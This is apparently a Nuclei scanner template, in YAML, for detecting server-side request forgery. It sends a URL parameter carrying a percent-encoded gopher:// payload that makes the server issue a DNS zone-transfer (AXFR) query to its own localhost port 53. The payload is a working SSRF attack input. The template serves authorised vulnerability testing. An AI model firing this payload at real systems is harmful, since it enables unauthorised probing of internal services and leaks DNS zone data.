id: gopher-dns-axfr

info:
  name: DNS AXFR via Gopher SSRF
  author: Jake Lo.ai
  severity: medium

http:
  - method: GET
    path:
      # Encoded DNS AXFR query for example.lab
      - "{{BaseURL}}/?url=gopher://127.0.0.1:53/_%00%1b%01%03%03%07%00%01%00%00%00%00%00%00%07example%03lab%00%00%fc%00%01"

    matchers:
      - type: word
        part: body
        words:
          - "example"
          - "lab"
